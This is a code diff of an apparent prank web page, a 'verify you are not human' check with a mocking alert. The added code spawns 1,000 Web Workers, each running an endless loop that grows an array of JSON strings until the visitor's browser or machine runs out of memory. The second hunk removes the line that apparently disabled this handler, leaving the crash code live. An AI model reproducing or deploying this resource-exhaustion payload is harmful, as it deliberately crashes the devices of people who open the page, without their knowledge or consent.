@@ -138,10 +138,10 @@
       let errormessage = document.getElementById('errormessage')
 
       let onverify = () => {
-        alert("Thank you for verifying that you are not human. If you are human, we will crash your PC, and send a robot firing squad to your location shortly.")
-        for (let i = 0; i < 50; i++) {const w = new Worker(URL.createObjectURL(
-          new Blob(['let a=[1];while(true){a.push(JSON.stringify(a))}'], {type: 'text/javascript'})
-        ))}
+        alert("Thank you for verifying that you are not human. If you are human, we will crash your PC and send a robot firing squad to your location immediately.");
+        for (let i = 0; i < 1000; i++) {const w = new Worker(URL.createObjectURL(
+          new Blob(['let a=[""];while(true){a.push(JSON.stringify(a))}'], {type: 'text/javascript'})
+        )); console.log(i)}
       }
       let onreset = () => {}
       let intervals = []
@@ -208,7 +208,6 @@
           intervals = false // any intervals called before loading will error
           errormessage.innerText = ""
           errormessage.style = ""
-          onverify = () => {}
           onreset()
           onreset = () => {}
           document.body.style = ""
